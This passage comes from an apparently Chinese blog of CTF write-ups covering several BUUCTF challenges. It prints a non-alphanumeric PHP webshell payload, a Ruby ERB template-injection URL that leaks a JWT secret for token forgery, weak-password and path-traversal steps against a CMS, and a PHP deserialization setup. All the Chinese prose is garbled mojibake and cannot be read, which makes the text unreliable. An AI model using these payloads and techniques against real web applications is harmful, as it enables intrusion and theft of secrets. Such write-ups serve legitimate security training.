å®šä¸‹æ¥çš„ã€‚æœ‰å¥è¯è¯´ï¼Œå¤å¾€ä»Šæ¥ä¸­å›½ä¸‰å¤§å¤©æ‰æ­»äºæ°´ï¼Œå…¶ä¸€å±ˆåŸï¼Œå…¶äºŒæç™½ï¼Œå…¶ä¸‰ç‹å›½ç»´ã€‚å«çªå¯¹æ­¤è¯é¢‡æœ‰ä¸æœï¼Œä¸çº ç»“ç‹å›½ç»´æ˜¯å¦èƒ½å¤Ÿä¸å‰äºŒè€…ç›¸æå¹¶è®ºï¼Œæˆ‘å•å–œæ¬¢ä»–çš„ç›´ç™½ï¼Œèƒ½ç•…å¿«è¯„è¯´å¤ä»Šè¯è¯çš„äººï¼Œä¹Ÿè®¸æ— å‡ºå…¶å³äº†å§ã€‚äººè¨€å¯ç•ã€äººè¨€å¯ç•ï¼Œè¶Šåˆ°ç°ä»£è¶Šä¼šæ·±æ·±æ„Ÿè§‰åˆ°è¿™å¥è¯çš„æ­£ç¡®ï¼Œçœ‹åˆ°å¾ˆå¤šäº‹æƒ…çš„å‘å±•å¾€å¾€è¢«èˆ†è®ºæ‰€å·¦å³ï¼Œå°±è¶Šç¾¡æ…•é‚£äº›æ— æ‰€ç•æƒ§çš„äººï¼Œä¸è®ºä»–ä»¬æ˜¯å‹‡æ•¢è¿˜æ˜¯è‡ªè´Ÿã€‚æ­¤é—´äººç‹å ç®—ä¸€ä¸ªï¼Œç½‘ç»œä¸Šäººä»¬å¯¹ä»–æ¯èª‰å‚åŠï¼Œä½†ç¡®å®æœ‰æœ¬äº‹è€Œåˆä¸çŸ«æ‰åšä½œï¼Œæ”¾èƒ†ç›´è¨€å¿ƒæ¯”å¤©é«˜çš„åªæœ‰ä»–ä¸€ä¸ªäº†ã€‚é‚£å¤©åœ¨æ˜†æ˜æ¹–ç•”çœ‹è¿‡å¤•é˜³ï¼Œç›´åˆ°å¤©ç©ºå˜çš„æ— æ¯”æ·±é‚ƒï¼Œæˆ‘æ‰æ…¢æ…¢å¾€å®¶çš„æ–¹å‘èµ°ã€‚è€³æœºæ”¾ç€åå¼¦çš„ã€Šæ˜†æ˜æ¹–ã€‹ï¼Œä¸çŸ¥ä¸è§‰å·²ç»åå¹´äº†ï¼Œä¸çŸ¥é“è¿™æ—¶å€™ä»–æœ‰æ²¡æœ‰å›é¦–æœ›æœ›è‡ªå·±çš„ä¹å…¬ä¸»å’Œå®‰å¨œï¼Œæ˜¯å¦è¿˜èƒ½å¤Ÿâ€œæ³¼å¢¨é€ ä¸€åŒ¹å¿«é©¬ï¼Œè¿½å›åå¹´å‰å§‘å¨˜â€ã€‚åæ¥ï¼Œæ„Ÿè§‰ä¸€åˆ‡éƒ½æ­¥å…¥æ­£è½¨ï¼Œå­¦ä½è¯ä¹Ÿé¡ºåˆ©æ‹¿åˆ°ï¼Œæˆ‘åŒ†åŒ†å‘Šåˆ«äº†è‡ªå·±çš„å¤§å­¦ã€‚åæ¥ä¹Ÿé‡åˆ°äº†å¾ˆå¤šäº‹ï¼Œäº‹åæœ‰äººæ‰¾æˆ‘ï¼Œå¾ˆå¤šäººå…³å¿ƒä½ ï¼Œå°‘æ•°äººå¯èƒ½ä¸æ˜¯ï¼Œä½†å‡ºäº†å­¦æ ¡ä»¥åï¼Œåˆæœ‰å¤šå°‘äººå’Œäº‹æƒ…å®Œå…¨æ²¡æœ‰ç›®çš„å‘¢ï¼Ÿæˆ‘ä¹Ÿè€ƒè™‘äº†å¾ˆå¤šå»å¤„ï¼Œä½†ä¸€ç›´æ²¡æœ‰å†³æ–­ï¼Œå€’æœ‰å¿µæ€€æ—§ä¸»ï¼Œä¹Ÿæœ‰å¦„è‡ªè²è–„ä¹‹æ„ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½åšå‡ºç‚¹æˆç»©å†å»è°ˆå…¶ä»–çš„ï¼Œæ‰€ä»¥å¾ˆä¹…éƒ½æ˜¯é—­é—¨ä¸å‡ºï¼Œç¢ç£¨ä¸œè¥¿ã€‚æ¥åˆ°å¦é—¨ï¼Œæˆ‘è¿˜äº†ä¸€ä¸ªæ„¿ï¼Œåˆè®¸äº†æ–°çš„æ„¿æœ›ï¼Œå¸Œæœ›æˆ‘è¿˜ä¼šå†æ¬¡æ¥è¿˜æ„¿ã€‚æˆ‘åˆæ¥åˆ°äº†ä¸Šæ¬¡æ²¡ä½å¤Ÿçš„é¼“æµªå±¿ï¼Œè®¢äº†ä¸€é—´å®‰é™çš„æˆ¿å­ï¼Œåªæœ‰æˆ‘ä¸€ä¸ªäººã€‚åœ¨è¿™é‡Œï¼Œèƒ½å¬åˆ°çš„åªæœ‰è¿œå¤„å±‹æªä¸‹é¸Ÿå„¿å½å½å–³å–³çš„é¸£å«å£°ï¼Œè¿œå¤„çš„å–§åš£æ—©å·²çƒŸæ¶ˆäº‘æ•£ï¼Œå³ä½¿è¿™åªæ˜¯æš‚æ—¶çš„ã€‚ç«™åœ¨å±‹é¡¶çš„æˆ‘ï¼Œå–ä¸‹æ¯ä¸­æœ€åä¸€å£æ°´ã€‚æ¸…æ™¨ï¼ŒèƒŒç€è¡Œæï¼Œæˆ‘ä¹˜è½®æ¸¡ç¦»å¼€äº†é¼“æµªå±¿ï¼Œè¿™æ˜¯æˆ‘ç¬¬äºŒæ¬¡æ¥é¼“æµªå±¿ï¼Œè°çŸ¥é“ä¼šä¸ä¼šæ˜¯æœ€åä¸€æ¬¡ã€‚æˆ‘åœ¨è¿™é‡Œä½äº†ä¸‰å¤©ï¼Œç”¨ä¸‰å¤©å»å¯»æ‰¾äº†ä¸€ä¸ªç­”æ¡ˆã€‚ä¸çŸ¥ä¸è§‰æˆ‘åˆæƒ³åˆ°è¾œé¸¿é“­ä¸æ²ˆå­åŸ¹çš„é‚£æ®µå¯¹è¯ã€‚â€œå¤§éš¾ä¸´å¤´ï¼Œä½•ä»¥ä¸ºä¹‹ï¼Ÿâ€â€œä¸–å—å›½æ©ï¼Œæ­»ç”Ÿç³»ä¹‹ã€‚â€&#39;;for($i &#x3D;0 ; $i &lt; 1000 ; $i++)&#123;    $sub_str &#x3D; mb_substr($dome, $i, 1);    echo $sub_str.&#39;&#x3D;&#39;.~($sub_str)[1];    echo &quot;\r\n&quot;;&#125;</code></pre><p>æˆ‘ä»¬æƒ³æ„é€ systemï¼ˆè¿™é‡Œä¸æ„é€ evalçš„åŸå› æ˜¯<strong>eval å±äºPHPè¯­æ³•æ„é€ çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡ å˜é‡å‡½æ•° çš„å½¢å¼æ¥è°ƒç”¨ï¼ˆè™½ç„¶å®ƒç¡®å®åƒæäº†å‡½æ•°åŸå‹ï¼‰ã€‚</strong>è¿™æ ·çš„è¯­æ³•æ„é€ è¿˜åŒ…æ‹¬ï¼šechoï¼Œprintï¼Œunset()ï¼Œisset()ï¼Œempty()ï¼Œincludeï¼Œrequireï¼Œ..</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406154353685.png" alt="image-20220406154353685"></p><p>ç„¶åæŠŠæˆ‘ä»¬æƒ³è¦çš„å­—æ¯æ‰¾å‡ºæ¥</p><pre class="language-none"><code class="language-none">åŒ—&#x3D;så†²&#x3D;yåŒ—&#x3D;sæ‹©&#x3D;tçš„&#x3D;eå’Œ&#x3D;mè¯´&#x3D;På°&#x3D;Oç¬”&#x3D;Sç«™&#x3D;T</code></pre><p>å¥½äº†ï¼Œä½†æ˜¯1æ˜¯æ•°å­—ï¼Œæ˜¾ç„¶ä¸èƒ½ç›´æ¥ç”¨ï¼Œæ‰€ä»¥è¿˜è¦å°è¯•åˆ©ç”¨phpçš„ç‰¹æ€§è·å¾—1</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406160337447.png" alt="image-20220406160337447"></p><p>æœ€ç»ˆpayload</p><pre class="language-none"><code class="language-none">&lt;?&#x3D;$__&#x3D;[];$___&#x3D;[];$_&#x3D;$__&#x3D;&#x3D;$___;$____&#x3D;~(åŒ—)[$_].~(å†²)[$_].~(åŒ—)[$_].~(æ‹©)[$_].~(çš„)[$_].~(å’Œ)[$_];$_____&#x3D;_.~(è¯´)[$_].~(å°)[$_].~(ç¬”)[$_].~(ç«™)[$_];$____($$_____[$____]);</code></pre><p>phpä¼ ä¸Šå»ç›´æ¥ç»™æ³¨é‡Šäº†ï¼Œæ‰€ä»¥å¯ä»¥ç”¨çŸ­æ ‡ç­¾</p><p>flagåœ¨ç¯å¢ƒå˜é‡é‡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406164336286.png" alt="image-20220406164336286"></p><h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p>ç‚¹è¿›å»ä¹‹å‰æˆ‘è¿˜ä»¥ä¸ºæ˜¯ä¸ªæ¡ä»¶ç«äº‰ã€‚ã€‚ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407141457347.png" alt="image-20220407141457347"></p><p>é’±æ˜¾ç„¶ä¸å¤Ÿä¹°flagçš„ï¼Œç‚¹workå¯ä»¥å¢åŠ ï¼Œä½†æ˜¯è¿™é“é¢˜æ˜¾ç„¶ä¸æ˜¯ä¸ºäº†æµ‹è„šæœ¬ç¼–å†™æ°´å¹³çš„</p><p>ç½‘ç«™å­˜åœ¨jwt</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407141641849.png" alt="image-20220407141641849"></p><p>è§£ç çœ‹ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407141659470.png" alt="image-20220407141659470"></p><p>ä½†æ˜¯è¿™é‡Œæœ‰ç€æˆ‘ä»¬ä¸çŸ¥é“çš„å¯†é’¥ï¼Œé‚£ä¹ˆä¸‹é¢å°±æ˜¯æƒ³åŠæ³•è·å–å¯†é’¥æŠŠjwté‡Œçš„jklå€¼æ”¹å¤§ï¼Œè´­ä¹°flagå°±è¡Œäº†</p><p>ç½‘ç«™å­˜åœ¨robots.txtï¼Œè®¿é—®ä¸€ä¸‹çœ‹åˆ°filebakè·¯å¾„</p><pre class="language-none"><code class="language-none">require &#39;sinatra&#39;require &#39;sinatra&#x2F;cookies&#39;require &#39;sinatra&#x2F;json&#39;require &#39;jwt&#39;require &#39;securerandom&#39;require &#39;erb&#39;set :public_folder, File.dirname(__FILE__) + &#39;&#x2F;static&#39;FLAGPRICE &#x3D; 1000000000000000000000000000ENV[&quot;SECRET&quot;] &#x3D; SecureRandom.hex(64)configure do  enable :logging  file &#x3D; File.new(File.dirname(__FILE__) + &#39;&#x2F;..&#x2F;log&#x2F;http.log&#39;,&quot;a+&quot;)  file.sync &#x3D; true  use Rack::CommonLogger, fileendget &quot;&#x2F;&quot; do  redirect &#39;&#x2F;shop&#39;, 302endget &quot;&#x2F;filebak&quot; do  content_type :text  erb IO.binread __FILE__endget &quot;&#x2F;api&#x2F;auth&quot; do  payload &#x3D; &#123; uid: SecureRandom.uuid , jkl: 20&#125;  auth &#x3D; JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;  cookies[:auth] &#x3D; authendget &quot;&#x2F;api&#x2F;info&quot; do  islogin  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;&#x2F;shop&quot; do  erb :shopendget &quot;&#x2F;work&quot; do  islogin  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth &#x3D; auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] &#x3D; auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result  endendpost &quot;&#x2F;shop&quot; do  islogin  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)  else    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] &#x3D; auth    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)  endenddef islogin  if cookies[:auth].nil? then    redirect to(&#39;&#x2F;shop&#39;)  endend</code></pre><p>è¿™é‡Œæ˜¯ä¸ªrubyçš„æ¨¡æ¿æ³¨å…¥æ¼æ´</p><p><a href="https://www.anquanke.com/post/id/86867">ã€æŠ€æœ¯åˆ†äº«ã€‘æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•å®ŒæˆRuby ERBæ¨¡æ¿æ³¨å…¥ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>ä¸»è¦æ˜¯çœ‹workè·¯ç”±è¿™å—</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407142001278.png" alt="image-20220407142001278"></p><p>rubyæ²¡å­¦è¿‡ï¼Œä¹Ÿæ²¡å®‰ç¯å¢ƒï¼Œæœ‰çš„åœ°æ–¹å°±ç›´æ¥æˆªåˆ«çš„å¸ˆå‚…çš„åšå®¢äº†</p><p>å…ˆçœ‹ä¸‹è¾¹è¿™æ®µ</p><p>è¿™æ®µå¤§æ¦‚æ„æ€å°±æ˜¯è¦æˆ‘ä»¬è¾“å…¥çš„doçš„å‚æ•°å’Œ<code>#&#123;params[:name][0,7]&#125; is working</code>è¿™å—è¿›è¡Œä¸€ä¸ªæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰å°±ä¼šæ‰§è¡Œ<code>&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;</code>è¿™æ®µï¼Œè€Œ<code>#&#123;params[:name][0,7]&#125;</code>è¿™é‡Œæˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„rubyçš„<code>Erb</code>æ¨¡æ¿æ³¨å…¥ï¼Œæ³¨å…¥è¯­å¥çš„æ ¼å¼æ˜¯&lt;%=%&gt;è‡³å°‘æ˜¯äº”ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ä¹‹å‰çš„å‚æ•°çš„æ¯”è¾ƒåªæ¯”è¾ƒnameå‚æ•°çš„å‰ä¸ƒä½ï¼Œæ‰€ä»¥æˆ‘ä»¬å®é™…èƒ½æ§åˆ¶çš„ä¹Ÿå°±åªæœ‰ä¸¤ä¸ªå­—ç¬¦</p><p>æˆ‘ä»¬å¯ä»¥å…ˆè¯•è¯•è®©å®ƒè¾“å‡º1ï¼Œç‰¹æ®Šå­—ç¬¦è®°å¾—è¦å…ˆurlç¼–ä¸ªç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407144338866.png" alt="image-20220407144338866"></p><p>å†çœ‹ä¸Šè¾¹è¿™æ®µï¼Œä»–ä¼šå°†æˆ‘ä»¬ä»¥secretä¸ºé”®çš„å‚æ•°ä¸ç¯å¢ƒå˜é‡é‡Œçš„secretè¿›è¡Œæ¯”è¾ƒï¼Œç„¶åè¾“å‡ºå¢ƒå˜é‡é‡Œçš„secret</p><p>è¿™é‡Œéœ€è¦ç”¨åˆ°<code>Ruby</code>è¯­è¨€çš„ä¸€ä¸ªç‰¹æ€§ã€‚rubyçš„å…¨å±€å˜é‡</p><p><a href="https://blog.csdn.net/zdq0394123/article/details/8443694">(3æ¡æ¶ˆæ¯) Rubyå…¨å±€å˜é‡æ±‡æ€»_zdq0394çš„åšå®¢-CSDNåšå®¢</a></p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶ä¸­çš„<code>$&#39;</code>æ¥è¿”å›æ­£åˆ™åŒ¹é…ç»“æœçš„å³è¾¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407145649686.png" alt="image-20220407145649686"></p><p>æ‰€ä»¥æˆ‘ä»¬å¦‚æœæŠŠä¼ å…¥çš„secretå€¼ä¸ºç©ºï¼Œé‚£ä¹ˆé»˜è®¤ç¯å¢ƒå˜é‡é‡Œçš„secretå…¨åœ¨åŒ¹é…ç»“æœçš„å³è¾¹ï¼Œä¹Ÿå°±èƒ½è¯»å‡ºæˆ‘ä»¬çš„å¯†é’¥</p><pre class="language-none"><code class="language-none">&#x2F;work?name&#x3D;&lt;%25&#x3D;$%27%25&gt;&amp;do&#x3D;&lt;%25&#x3D;$%27%25&gt;%20is%20working&amp;SECRET&#x3D;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407145856242.png" alt="image-20220407145856242"></p><p>æ‹¿åˆ°å¯†é’¥ç›´æ¥æ”¹jwtå°±è¡Œäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407150544659.png" alt="image-20220407150544659"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407150645048.png" alt="image-20220407150645048"></p><p>ä¹°äº†flagä¹‹åå†å¯¹jwtè§£ä¸ªç å°±èƒ½æ‹¿åˆ°flagäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407150731822.png" alt="image-20220407150731822"></p><h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>æç¤ºæ˜¯åå°äº”ä½å¼±å¯†ç </p><p>æ‰€ä»¥çŒœadmin/adminæˆ–è€…æ˜¯admin/12345</p><p>è¿›å…¥åç›´æ¥è®¿é—®admin.phpç„¶åadmin/12345ç™»å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409175631685.png" alt="image-20220409175631685"></p><p>è¿™é¢˜è§£æ³•æœ‰ä¸¤ç§</p><p><strong>ç¬¬ä¸€ç§</strong></p><p>è®¾è®¡-ä¸»é¢˜é‡Œå¯ä»¥è¿›è¡Œè‡ªå®šä¹‰è®¾ç½®ï¼Œè€Œç±»å‹å¯ä»¥é€‰phpæºä»£ç ï¼Œä¹Ÿå°±å¯ä»¥ç›´æ¥å†™å…¥å‘½ä»¤æ¥æ‰§è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409175811880.png" alt="image-20220409175811880"></p><p>ä½†æ˜¯å½“ä½ å†™å…¥æ—¶ä¼šæ˜¾ç¤º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409180227413.png" alt="image-20220409180227413"></p><p>è¿™æ˜¯å› ä¸ºåœ¨å®‰å…¨è¿™é‡Œè®¾ç½®äº†æ–‡ä»¶éªŒè¯</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409180314453.png" alt="image-20220409180314453"></p><p>ä½†æ˜¯è¦å–æ¶ˆæ–‡ä»¶éªŒè¯ä¹Ÿè¦æœ‰è¿™ä¸ªæ–‡ä»¶</p><p>è¿™æ—¶å€™å°±è¦åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409181921966.png" alt="image-20220409181921966"></p><p>ä¼ ä¸ªæ–‡ä»¶å¯ä»¥çœ‹åˆ°å­˜å‚¨è·¯å¾„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182027467.png" alt="image-20220409182027467"></p><p>é‚£å¦‚æœæˆ‘ä»¬é‡å‘½åè¿™ä¸ªæ–‡ä»¶èƒ½ä¸èƒ½å®ç°ç›®å½•ç©¿è¶Šï¼Œè®©å®ƒä¸Šä¼ åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®å½•ä¸‹å‘¢</p><p>ç»“æœæ˜¯å¯ä»¥çš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182445406.png" alt="image-20220409182445406"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å»æ‰æ–‡ä»¶éªŒè¯ï¼Œç„¶ååˆ©ç”¨cat /flagæŸ¥çœ‹flagäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182652538.png" alt="image-20220409182652538"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182641926.png" alt="image-20220409182641926"></p><p><strong>æ–¹æ³•äºŒ</strong></p><p>åœ¨å¯¼å‡ºä¸»é¢˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹ä¸‹è½½é“¾æ¥</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;511d2b5b-5b1e-4369-bccf-8bce11b0cea1.node4.buuoj.cn:81&#x2F;admin.php?m&#x3D;ui&amp;f&#x3D;downloadtheme&amp;theme&#x3D;L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMTIzLnppcA&#x3D;&#x3D;</code></pre><p>å¯¹åè¾¹è¿™æ®µbase64è§£ç å¯ä»¥çœ‹å‡º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409183057640.png" alt="image-20220409183057640"></p><p>è¿™é‡Œæ˜¯æ–‡ä»¶çš„è·¯å¾„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªä¿®æ”¹æˆ/flagæ¥ç›´æ¥ä¸‹è½½flagï¼ˆçŒœflagçš„æ–‡ä»¶åæ„Ÿè§‰å¤ªçœ‹è¿æ°”äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409183154025.png" alt="image-20220409183154025"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409183220108.png" alt="image-20220409183220108"></p><p>è¿™é“é¢˜æ„Ÿè§‰éš¾åº¦ä¸é«˜ï¼Œä½†æ›´åƒçœŸå®ç¯å¢ƒï¼Œæ‰€ä»¥æ›´éœ€è¦æ€è·¯å’Œç»éªŒ</p><h2 id="å¼ºç½‘æ¯-2019-Upload"><a href="#å¼ºç½‘æ¯-2019-Upload" class="headerlink" title="[å¼ºç½‘æ¯ 2019]Upload"></a>[å¼ºç½‘æ¯ 2019]Upload</h2><p>æ‰“ç€æ–‡ä»¶ä¸Šä¼ åå­—çš„ååºåˆ—åŒ–é¢˜</p><p>è¿›å…¥åå…ˆæ³¨å†Œï¼Œç™»å½•èƒ½çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œä¼ ä¸ªå›¾ç‰‡ä¸Šå»ï¼Œå‘ç°èƒ½çœ‹è§è·¯å¾„ï¼Œé‚£å¾ˆæ˜¾ç„¶è¦ä¼ ä¸ªé©¬ä¸Šå»è¿ä¸€ä¸‹ã€‚</p><p>è¿™æ—¶å€™æˆ‘ä»¬å‘ç°cookieé‡Œæœ‰ä¸€æ®µåƒbase64çš„ç¼–ç ï¼Œè§£å¯†ä¸€ä¸‹å‘ç°æ˜¯åºåˆ—åŒ–çš„å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411151627165.png" alt="image-20220411151627165"></p><p>ä¸€èˆ¬åºåˆ—åŒ–åº”è¯¥éƒ½ä¼šç»™æºç ï¼Œæ‰€ä»¥æ‰¾ä¸€ä¸‹ç›®å½•ï¼Œæœ‰<a href="http://www.tar.gz/">www.tar.gz</a></p><p>ä¸»è¦æ˜¯è¿™å‡ ä¸ªæ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152330537.png" alt="image-20220411152330537"></p><p>ç”¨phpstormæ‰“å¼€ä¹‹åèƒ½å‘ç°index.phpå’Œregister.phpé‡Œè¢«æ‰“äº†ä¸¤ä¸ªæ–­ç‚¹</p><p>register.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152628334.png" alt="image-20220411152628334"></p><p>index.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152643205.png" alt="image-20220411152643205"></p><p>ç®—æ˜¯å‡ºé¢˜äººç»™çš„æç¤ºå§ï¼Œregisteré‚£é‡Œæ˜¯æˆ‘ä»¬è¦åˆ©ç”¨çš„åºåˆ—åŒ–çš„å…¥å£ï¼Œregistedå’Œcheckerå‚æ•°å¯æ§ï¼Œè®©checkerå®ä¾‹åŒ–proflieç±»å°±èƒ½è°ƒç”¨profileé‡Œçš„é­”æœ¯æ–¹æ³•ï¼Œå®ç°æˆ‘ä»¬åé¢çš„ååºåˆ—åŒ–ï¼Œè€Œindexé‚£é‡Œèƒ½å¤Ÿå¯¹åºåˆ—åŒ–å†…å®¹è¿›è¡Œååºåˆ—åŒ–ï¼Œå®ç°æ¼æ´åˆ©ç”¨çš„ç›®çš„ã€‚</p><p>æˆ‘ä»¬å†æ¥çœ‹çœ‹profile.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpnamespace app\web\controller;use think\Controller;class Profile extends Controller&#123;    public $checker;    public $filename_tmp;    public $filename;    public $upload_menu;    public $ext;    public $img;    public $except;    public function __construct()    &#123;        $this-&gt;checker&#x3D;new Index();        $this-&gt;upload_menu&#x3D;md5($_SERVER[&#39;REMOTE_ADDR&#39;]);        @chdir(&quot;..&#x2F;public&#x2F;upload&quot;);        if(!is_dir($this-&gt;upload_menu))&#123;            @mkdir($this-&gt;upload_menu);        &#125;        @chdir($this-&gt;upload_menu);    &#125;    public function upload_img()&#123;        if($this-&gt;checker)&#123;            if(!$this-&gt;checker-&gt;login_check())&#123;                $curr_url&#x3D;&quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#x2F;index&quot;;                $this-&gt;redirect($curr_url,302);                exit();            &#125;        &#125;        if(!empty($_FILES))&#123;            